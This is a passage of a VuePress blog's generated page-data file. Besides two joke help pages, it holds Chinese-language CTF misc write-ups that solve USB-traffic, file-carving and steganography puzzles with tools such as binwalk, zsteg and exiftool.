password?",lang:"zh-CN",frontmatter:{stick:!1,tag:["help"],categories:["help","歪比八卜"]},excerpt:"",headers:[{level:3,title:"我能笑话你一年，那还能咋办,进数据库自己看",slug:"我能笑话你一年-那还能咋办-进数据库自己看",children:[]}],git:{}},key:"v-4911275f",path:"/help.html",title:"forget password?",lang:"zh-CN",frontmatter:{stick:!1,tag:["help"],categories:["help","歪比八卜"]},excerpt:"",headers:[{level:3,title:"我能笑话你一年，那还能咋办,进数据库自己看",slug:"我能笑话你一年-那还能咋办-进数据库自己看",children:[]}],content:"\r\n# forget password?\r\n\r\n### 我能笑话你一年，那还能咋办,进数据库自己看\r\n\r\n",contentRendered:'<h1 id="forget-password" tabindex="-1"><a class="header-anchor" href="#forget-password" aria-hidden="true">#</a> forget password?</h1>\n<h3 id="我能笑话你一年-那还能咋办-进数据库自己看" tabindex="-1"><a class="header-anchor" href="#我能笑话你一年-那还能咋办-进数据库自己看" aria-hidden="true">#</a> 我能笑话你一年，那还能咋办,进数据库自己看</h3>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/help.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"help",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/help.md",filePathRelative:"help.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/help.html.vue",componentFilePathRelative:"pages/help.html.vue",componentFileChunkName:"v-4911275f",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/help.html.js",dataFilePathRelative:"pages/help.html.js",dataFileChunkName:"v-4911275f",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/help.html",htmlFilePathRelative:"help.html"},{data:{key:"v-5133825e",path:"/sb.html",title:"服务协议？隐私政策?",lang:"zh-CN",frontmatter:{stick:!1,tag:["help"],categories:["help","歪比八卜"]},excerpt:"",headers:[{level:3,title:"这种破网站哪来隐私政策和服务协议？先笑话你一年",slug:"这种破网站哪来隐私政策和服务协议-先笑话你一年",children:[]}],git:{}},key:"v-5133825e",path:"/sb.html",title:"服务协议？隐私政策?",lang:"zh-CN",frontmatter:{stick:!1,tag:["help"],categories:["help","歪比八卜"]},excerpt:"",headers:[{level:3,title:"这种破网站哪来隐私政策和服务协议？先笑话你一年",slug:"这种破网站哪来隐私政策和服务协议-先笑话你一年",children:[]}],content:"\r\n# 服务协议？隐私政策?\r\n\r\n### 这种破网站哪来隐私政策和服务协议？先笑话你一年\r\n\r\n",contentRendered:'<h1 id="服务协议-隐私政策" tabindex="-1"><a class="header-anchor" href="#服务协议-隐私政策" aria-hidden="true">#</a> 服务协议？隐私政策?</h1>\n<h3 id="这种破网站哪来隐私政策和服务协议-先笑话你一年" tabindex="-1"><a class="header-anchor" href="#这种破网站哪来隐私政策和服务协议-先笑话你一年" aria-hidden="true">#</a> 这种破网站哪来隐私政策和服务协议？先笑话你一年</h3>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/sb.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"sb",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/sb.md",filePathRelative:"sb.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/sb.html.vue",componentFilePathRelative:"pages/sb.html.vue",componentFileChunkName:"v-5133825e",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/sb.html.js",dataFilePathRelative:"pages/sb.html.js",dataFileChunkName:"v-5133825e",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/sb.html",htmlFilePathRelative:"sb.html"},{data:{key:"v-2eba71ab",path:"/xiangmusi.html",title:"项目四",lang:"zh-CN",frontmatter:{},excerpt:"",headers:[],git:{}},key:"v-2eba71ab",path:"/xiangmusi.html",title:"项目四",lang:"zh-CN",frontmatter:{},excerpt:"",headers:[],content:"# 项目四",contentRendered:'<h1 id="项目四" tabindex="-1"><a class="header-anchor" href="#项目四" aria-hidden="true">#</a> 项目四</h1>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/xiangmusi.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"xiangmusi",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/xiangmusi.md",filePathRelative:"xiangmusi.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/xiangmusi.html.vue",componentFilePathRelative:"pages/xiangmusi.html.vue",componentFileChunkName:"v-2eba71ab",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/xiangmusi.html.js",dataFilePathRelative:"pages/xiangmusi.html.js",dataFileChunkName:"v-2eba71ab",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/xiangmusi.html",htmlFilePathRelative:"xiangmusi.html"},{data:{key:"v-c4be0d9c",path:"/misc/1.html",title:"misc刷题（杂七杂八）",lang:"zh-CN",frontmatter:{date:"2023/7/10 16:18",stick:!1,keyword:"misc",description:"刷题",title:"misc刷题（杂七杂八）",tag:["ctfshow刷题"],categories:["misc","歪比八卜"]},excerpt:"",headers:[{level:2,title:"[CISCN 2022 初赛]ez_usb",slug:"ciscn-2022-初赛-ez-usb",children:[]},{level:2,title:"[CISCN 2018]Picture",slug:"ciscn-2018-picture",children:[]},{level:2,title:"[CISCN 2023 初赛]被加密的生产流量",slug:"ciscn-2023-初赛-被加密的生产流量",children:[]},{level:2,title:"[CISCN 2022 初赛]everlasting_night",slug:"ciscn-2022-初赛-everlasting-night",children:[]},{level:2,title:"[CISCN 2021初赛]running_pixel",slug:"ciscn-2021初赛-running-pixel",children:[]}],git:{}},key:"v-c4be0d9c",path:"/misc/1.html",title:"misc刷题（杂七杂八）",lang:"zh-CN",frontmatter:{date:"2023/7/10 16:18",stick:!1,keyword:"misc",description:"刷题",title:"misc刷题（杂七杂八）",tag:["ctfshow刷题"],categories:["misc","歪比八卜"]},excerpt:"",headers:[{level:2,title:"[CISCN 2022 初赛]ez_usb",slug:"ciscn-2022-初赛-ez-usb",children:[]},{level:2,title:"[CISCN 2018]Picture",slug:"ciscn-2018-picture",children:[]},{level:2,title:"[CISCN 2023 初赛]被加密的生产流量",slug:"ciscn-2023-初赛-被加密的生产流量",children:[]},{level:2,title:"[CISCN 2022 初赛]everlasting_night",slug:"ciscn-2022-初赛-everlasting-night",children:[]},{level:2,title:"[CISCN 2021初赛]running_pixel",slug:"ciscn-2021初赛-running-pixel",children:[]}],content:"\r\n## [CISCN 2022 初赛]ez_usb\r\n\r\n这道题已经提示是一道usb流量分析题\r\n\r\n[USB流量取证分析](https://blog.51cto.com/u_15400016/4288275)\r\n\r\n> HID（Human Interface Device，人机接口设备）是USB设备中常用的[设备类型](https://www.usbzh.com/article/detail-273.html)，是直接与人交互的USB设备，例如键盘、鼠标与游戏杆等。在USB设备中，HID设备的成本较低。另外，HID设备并不一定要有人机交互功能，只要符合HID类别规范的设备都是HID设备。\r\n\r\n![image-20230724172358412](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241723667.png)\r\n\r\nusbhid.data先筛选有hid的流量 一般来讲是键盘、鼠标、游戏杆\r\n\r\n有三组2.8.1  ，2.4.1，2.10.1\r\n\r\n分别把他们重组\r\n\r\n2.4.1的流量包中包数据长度为0 应该是一个混淆包\r\n\r\n![image-20230725083740988](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250837270.png)\r\n\r\n一般usb流量隐写，要么键盘隐写，或者是鼠标隐写\r\n\r\n将其放入usb键盘鼠标流量脚本跑 此处使用的是\r\n\r\n![image-20230725084033262](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840287.png)\r\n\r\n> 2.8.1\r\n\r\n![image-20230725084009040](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840080.png)\r\n\r\n将其中的CAP和DEL删除 \r\n\r\n```\r\nJPEG文件头FFD8FFE0 00104A46,JPEG文件结尾为FFD9,rar的文件尾C43D7B00 400700,文件头52617221 1A0700即Rar!,ZIP文件头504B0304 0A00即PK,GIF开头`47494638 396即GIF,PNG文件头89504E47 0D0A1A0A 0000000D 49即|PNG,PNG文件结尾49454E44 AE426082即IEND bmp文件头424D即BM\r\n```\r\n\r\n文件头显示是rar文件，导入010editor 重新导出文件 （注意代码块十六进制需要ctrl+shift+v整段复制）\r\n\r\n> 2.10.1\r\n\r\n![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250845852.png)\r\n\r\n这个猜测是rar文件密码\r\n\r\n\r\n\r\n\r\n\r\n## [CISCN 2018]Picture\r\n\r\n拿到题目首先想着binwalk分离文件\r\n\r\n![image-20230725100342848](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251003939.png)\r\n\r\n分离以后文件发现文件有base64编码可能\r\n\r\n![image-20230725100758799](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251007833.png)\r\n\r\n这边我先解了一遍\r\n\r\n![image-20230725101417193](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251014228.png)\r\n\r\nkp开头中间也有pk 考点是文件头混肴，但是这个没法直接换成十六进制\r\n\r\n可以使用在线工具[Base64 在线编码解码 ](https://base64.us/)\r\n\r\n直接换成十六进制导入010editor然后修改文件头导出zip文件\r\n\r\n![image-20230725102139482](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251021568.png)\r\n\r\n注释中<- password啊是提示 然后根据前面的报错提示可以得到密码： integer division or modulo by zero\r\n\r\n![image-20230725102327781](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251023848.png)\r\n\r\n解压文件得到俩文件 一个假flag 另一个文件是编码\r\n\r\n![image-20230725102808612](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251028642.png)\r\n\r\n直接扔工具里面去跑了\r\n\r\n![image-20230725102923662](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251029722.png)\r\n\r\n是uuencode编码\r\n\r\n## [CISCN 2023 初赛]被加密的生产流量\r\n\r\n\r\n\r\n流量包的名字就是modbus 猜测与modbus有关 追踪tcp流 看隐写的内容\r\n\r\n![image-20230725111431413](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251114676.png)\r\n\r\n有等号是base编码 可以使用pyshark脚本跑切割，或者就是手动一个一个写下来这个\r\n\r\n放进解码器跑就行了\r\n\r\n![image-20230725141828416](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251418825.png)\r\n\r\n## [CISCN 2022 初赛]everlasting_night\r\n\r\n一道lsb隐写题\r\n\r\n首先打开010editor 查看这张png图片的hex 文件头和文件尾是全的 文件尾之后还有一串十六进制\r\n\r\n![image-20230728110233535](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281102581.png)\r\n\r\n32位 ？？？  md5 解密\r\n\r\n![image-20230728110753829](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281107876.png)\r\n\r\nohhWh04m1 不知道是什么东西 先留着再说\r\n\r\nstegsolve 打开图片 发现在alpha 通道2里面发现一点不对 \r\n\r\n![image-20230728111136364](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281111490.png)\r\n\r\n用data extract 打开alpha通道通道2  以列\r\n\r\n![image-20230728111757955](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281117018.png)  \r\n\r\n是有一串字符串的 还是不知道要用来干什么 \r\n\r\n学lsb隐写  那就跑脚本了 上面的字符串是lsb隐写的密码 \r\n\r\n![image-20230728112352233](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123269.png)\r\n\r\n先导了一份文本文件，pk文件头 导一份zip出来\r\n\r\n![image-20230728112306789](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123857.png)\r\n\r\nzip解压缩有密码，拿第一个密码解压 出了一个flag文件 看格式应该是png 但是文件损坏\r\n\r\n看wp 需要用gimp打开 并且需要改一下后缀名为data\r\n\r\n`gimp flag.data`\r\n\r\n改一点宽度 就出来了\r\n\r\n![image-20230728112729732](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281127822.png)\r\n\r\n## [CISCN 2021初赛]running_pixel",contentRendered:'<h2 id="ciscn-2022-初赛-ez-usb" tabindex="-1"><a class="header-anchor" href="#ciscn-2022-初赛-ez-usb" aria-hidden="true">#</a> [CISCN 2022 初赛]ez_usb</h2>\n<p>这道题已经提示是一道usb流量分析题</p>\n<p><a href="https://blog.51cto.com/u_15400016/4288275" target="_blank" rel="noopener noreferrer">USB流量取证分析<ExternalLinkIcon/></a></p>\n<blockquote>\n<p>HID（Human Interface Device，人机接口设备）是USB设备中常用的<a href="https://www.usbzh.com/article/detail-273.html" target="_blank" rel="noopener noreferrer">设备类型<ExternalLinkIcon/></a>，是直接与人交互的USB设备，例如键盘、鼠标与游戏杆等。在USB设备中，HID设备的成本较低。另外，HID设备并不一定要有人机交互功能，只要符合HID类别规范的设备都是HID设备。</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724172358412" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241723667.png" data="aurora"></p>\n<p>usbhid.data先筛选有hid的流量 一般来讲是键盘、鼠标、游戏杆</p>\n<p>有三组2.8.1  ，2.4.1，2.10.1</p>\n<p>分别把他们重组</p>\n<p>2.4.1的流量包中包数据长度为0 应该是一个混淆包</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725083740988" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250837270.png" data="aurora"></p>\n<p>一般usb流量隐写，要么键盘隐写，或者是鼠标隐写</p>\n<p>将其放入usb键盘鼠标流量脚本跑 此处使用的是</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725084033262" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840287.png" data="aurora"></p>\n<blockquote>\n<p>2.8.1</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725084009040" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840080.png" data="aurora"></p>\n<p>将其中的CAP和DEL删除</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>JPEG文件头FFD8FFE0 00104A46,JPEG文件结尾为FFD9,rar的文件尾C43D7B00 400700,文件头52617221 1A0700即Rar!,ZIP文件头504B0304 0A00即PK,GIF开头`47494638 396即GIF,PNG文件头89504E47 0D0A1A0A 0000000D 49即|PNG,PNG文件结尾49454E44 AE426082即IEND bmp文件头424D即BM\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div><p>文件头显示是rar文件，导入010editor 重新导出文件 （注意代码块十六进制需要ctrl+shift+v整段复制）</p>\n<blockquote>\n<p>2.10.1</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250845852.png" data="aurora"></p>\n<p>这个猜测是rar文件密码</p>\n<h2 id="ciscn-2018-picture" tabindex="-1"><a class="header-anchor" href="#ciscn-2018-picture" aria-hidden="true">#</a> [CISCN 2018]Picture</h2>\n<p>拿到题目首先想着binwalk分离文件</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725100342848" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251003939.png" data="aurora"></p>\n<p>分离以后文件发现文件有base64编码可能</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725100758799" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251007833.png" data="aurora"></p>\n<p>这边我先解了一遍</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725101417193" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251014228.png" data="aurora"></p>\n<p>kp开头中间也有pk 考点是文件头混肴，但是这个没法直接换成十六进制</p>\n<p>可以使用在线工具<a href="https://base64.us/" target="_blank" rel="noopener noreferrer">Base64 在线编码解码 <ExternalLinkIcon/></a></p>\n<p>直接换成十六进制导入010editor然后修改文件头导出zip文件</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725102139482" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251021568.png" data="aurora"></p>\n<p>注释中&lt;- password啊是提示 然后根据前面的报错提示可以得到密码： integer division or modulo by zero</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725102327781" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251023848.png" data="aurora"></p>\n<p>解压文件得到俩文件 一个假flag 另一个文件是编码</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725102808612" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251028642.png" data="aurora"></p>\n<p>直接扔工具里面去跑了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725102923662" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251029722.png" data="aurora"></p>\n<p>是uuencode编码</p>\n<h2 id="ciscn-2023-初赛-被加密的生产流量" tabindex="-1"><a class="header-anchor" href="#ciscn-2023-初赛-被加密的生产流量" aria-hidden="true">#</a> [CISCN 2023 初赛]被加密的生产流量</h2>\n<p>流量包的名字就是modbus 猜测与modbus有关 追踪tcp流 看隐写的内容</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725111431413" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251114676.png" data="aurora"></p>\n<p>有等号是base编码 可以使用pyshark脚本跑切割，或者就是手动一个一个写下来这个</p>\n<p>放进解码器跑就行了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725141828416" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251418825.png" data="aurora"></p>\n<h2 id="ciscn-2022-初赛-everlasting-night" tabindex="-1"><a class="header-anchor" href="#ciscn-2022-初赛-everlasting-night" aria-hidden="true">#</a> [CISCN 2022 初赛]everlasting_night</h2>\n<p>一道lsb隐写题</p>\n<p>首先打开010editor 查看这张png图片的hex 文件头和文件尾是全的 文件尾之后还有一串十六进制</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728110233535" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281102581.png" data="aurora"></p>\n<p>32位 ？？？  md5 解密</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728110753829" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281107876.png" data="aurora"></p>\n<p>ohhWh04m1 不知道是什么东西 先留着再说</p>\n<p>stegsolve 打开图片 发现在alpha 通道2里面发现一点不对</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728111136364" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281111490.png" data="aurora"></p>\n<p>用data extract 打开alpha通道通道2  以列</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728111757955" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281117018.png" data="aurora"></p>\n<p>是有一串字符串的 还是不知道要用来干什么</p>\n<p>学lsb隐写  那就跑脚本了 上面的字符串是lsb隐写的密码</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728112352233" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123269.png" data="aurora"></p>\n<p>先导了一份文本文件，pk文件头 导一份zip出来</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728112306789" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123857.png" data="aurora"></p>\n<p>zip解压缩有密码，拿第一个密码解压 出了一个flag文件 看格式应该是png 但是文件损坏</p>\n<p>看wp 需要用gimp打开 并且需要改一下后缀名为data</p>\n<p><code>gimp flag.data</code></p>\n<p>改一点宽度 就出来了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728112729732" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281127822.png" data="aurora"></p>\n<h2 id="ciscn-2021初赛-running-pixel" tabindex="-1"><a class="header-anchor" href="#ciscn-2021初赛-running-pixel" aria-hidden="true">#</a> [CISCN 2021初赛]running_pixel</h2>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/misc/1.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"1",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/misc/1.md",filePathRelative:"misc/1.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/1.html.vue",componentFilePathRelative:"pages/misc/1.html.vue",componentFileChunkName:"v-c4be0d9c",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/1.html.js",dataFilePathRelative:"pages/misc/1.html.js",dataFileChunkName:"v-c4be0d9c",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/misc/1.html",htmlFilePathRelative:"misc/1.html"},{data:{key:"v-7c00b81e",path:"/misc/misc1.html",title:"misc刷题（信息附加）",lang:"zh-CN",frontmatter:{date:"2023/5/26 16:18",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"misc刷题（信息附加）",tag:["ctfshow刷题"],categories:["信息附加","歪比八卜"]},excerpt:"",headers:[{level:2,title:"信息附加",slug:"信息附加",children:[{level:3,title:"Misc3",slug:"misc3",children:[]},{level:3,title:"misc5",slug:"misc5",children:[]},{level:3,title:"misc6",slug:"misc6",children:[]},{level:3,title:"misc7",slug:"misc7",children:[]},{level:3,title:"misc8",slug:"misc8",children:[]},{level:3,title:"misc9",slug:"misc9",children:[]},{level:3,title:"misc10",slug:"misc10",children:[]},{level:3,title:"misc11",slug:"misc11",children:[]},{level:3,title:"misc12",slug:"misc12",children:[]},{level:3,title:"misc13",slug:"misc13",children:[]},{level:3,title:"misc14",slug:"misc14",children:[]},{level:3,title:"misc15",slug:"misc15",children:[]},{level:3,title:"misc16",slug:"misc16",children:[]},{level:3,title:"misc17",slug:"misc17",children:[]},{level:3,title:"misc18",slug:"misc18",children:[]},{level:3,title:"misc19",slug:"misc19",children:[]},{level:3,title:"misc20",slug:"misc20",children:[]},{level:3,title:"misc21",slug:"misc21",children:[]},{level:3,title:"misc22",slug:"misc22",children:[]},{level:3,title:"misc23",slug:"misc23",children:[]}]},{level:2,title:"信息附加的总结：",slug:"信息附加的总结",children:[]}],git:{}},key:"v-7c00b81e",path:"/misc/misc1.html",title:"misc刷题（信息附加）",lang:"zh-CN",frontmatter:{date:"2023/5/26 16:18",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"misc刷题（信息附加）",tag:["ctfshow刷题"],categories:["信息附加","歪比八卜"]},excerpt:"",headers:[{level:2,title:"信息附加",slug:"信息附加",children:[{level:3,title:"Misc3",slug:"misc3",children:[]},{level:3,title:"misc5",slug:"misc5",children:[]},{level:3,title:"misc6",slug:"misc6",children:[]},{level:3,title:"misc7",slug:"misc7",children:[]},{level:3,title:"misc8",slug:"misc8",children:[]},{level:3,title:"misc9",slug:"misc9",children:[]},{level:3,title:"misc10",slug:"misc10",children:[]},{level:3,title:"misc11",slug:"misc11",children:[]},{level:3,title:"misc12",slug:"misc12",children:[]},{level:3,title:"misc13",slug:"misc13",children:[]},{level:3,title:"misc14",slug:"misc14",children:[]},{level:3,title:"misc15",slug:"misc15",children:[]},{level:3,title:"misc16",slug:"misc16",children:[]},{level:3,title:"misc17",slug:"misc17",children:[]},{level:3,title:"misc18",slug:"misc18",children:[]},{level:3,title:"misc19",slug:"misc19",children:[]},{level:3,title:"misc20",slug:"misc20",children:[]},{level:3,title:"misc21",slug:"misc21",children:[]},{level:3,title:"misc22",slug:"misc22",children:[]},{level:3,title:"misc23",slug:"misc23",children:[]}]},{level:2,title:"信息附加的总结：",slug:"信息附加的总结",children:[]}],content:'\r\n# misc刷题（信息附加）\r\n\r\n##  信息附加\r\n\r\n### Misc3\r\n\r\n> Bpgview.exe 的使用 当文件后缀是bpg使用\r\n\r\n> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251822927.png" style="zoom:50%;" />\r\n\r\n### misc5\r\n\r\n> 图片隐写\r\n>\r\n> ![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825792.png)\r\n\r\n### misc6\r\n\r\n同理\r\n\r\n![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825010.png)\r\n\r\n### misc7\r\n\r\n> 同理 不放照片了\r\n\r\n### misc8\r\n\r\n ![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825199.png)\r\n\r\n> 使用foremost分离图片\r\n\r\n> 方法[foremost使用简介](https://blog.csdn.net/john_david_/article/details/87273152)\r\n\r\n### misc9\r\n\r\n> 用winhex查找\r\n\r\n### misc10\r\n\r\n> 图片文件的分离\r\n\r\n ![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826495.png)![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826104.png)\r\n\r\n \r\n\r\n> 根据提示搞 要将runas=root\r\n\r\n### misc11\r\n\r\n ![image-20230525182748221](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251827268.png)\r\n\r\n> 利用tweakpng 对png文件idat（数据）对图片内容改写\r\n\r\n ![image-20230525182805387](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828423.png)\r\n\r\n> 删除不同的数据块所获得的内容也不同\r\n\r\n### misc12 \r\n\r\n![image-20230525182820884](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828925.png)\r\n\r\n> 按f7预览\r\n\r\n> 从头逐个删除idat直至出现\r\n\r\n> 具体原因不清楚   idat的length应该是一样的 常规删除不一样的\r\n\r\n### misc13\r\n\r\n> 抽象的题目\r\n\r\n> 图片用winhex打开图片 发现有类似flag的东西？\r\n\r\n>   然后分析一个间隔一个的出现\r\n>\r\n> ![image-20230525182858447](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828483.png)\r\n\r\n> 那么将十六进制转化为byte类型再用切片提取flag\r\n\r\n![image-20230525182939765](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829795.png) \r\n\r\n \r\n\r\n### misc14\r\n\r\n ![image-20230525182953629](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829665.png)\r\n\r\n> Binwalk查看整个文件的块内容\r\n\r\n> 可以发现发现 有四个文件块 \r\n\r\n> 用dd命令进行分解 dd if=源文件 of=输出文件 skip=跳过的大小 count=提取文件的大小 bs=块大小 这边DECIMAL 是指的上一个文件的大小\r\n\r\n> 应该先查看文件的类型然后 对对应的文件进行分离\r\n\r\n \r\n\r\n### misc15\r\n\r\n> 用winhex查找\r\n\r\n 无图.jpg\r\n\r\n### misc16 \r\n\r\n> 用binwalk进行分离 得到文件夹下里面寻找\r\n\r\n 再次无图.jpg\r\n\r\n### misc17\r\n\r\n> 新工具的使用 zsteg 此工具可以对png 和bmp文件中隐写的数据进行分离 \r\n\r\n> [zsteg使用方法](https://blog.csdn.net/weixin_52941926/article/details/121536324)\r\n\r\n> 建议以后如果不会好好看\r\n\r\n> 可以先使用zsteg <文件名> --all 查看所有组合\r\n\r\n ![image-20230526161238348](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612400.png)\r\n\r\n> 这边发现是只有extradata:0模式下有隐藏内容\r\n\r\n> 所以对此进行分离\r\n\r\n ![image-20230526161256254](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612289.png)\r\n\r\n> 然后打开发现是乱码 然后就查答案 发现可以binwalk再次进行分离\r\n\r\n ![image-20230526161300816](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261613849.png)\r\n\r\n> 然后就分离出来了 \r\n\r\n \r\n\r\n### misc18\r\n\r\n> 藏在详细信息里\r\n\r\n![image-20230529165153643](C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230529165153643.png) \r\n\r\n> 就没啥好说的，多留意就行\r\n\r\n### misc19\r\n\r\n> 使用新工具exiftool查看图片的详细内容 \r\n\r\n![image-20230529165312013](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291653062.png)\r\n\r\n> 使用exiftool能看到一些隐藏的参数，所以这道隐写题 将flag放于document name 和host nname中\r\n\r\n![image-20230529165521755](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655788.png)\r\n\r\n> 那么同理 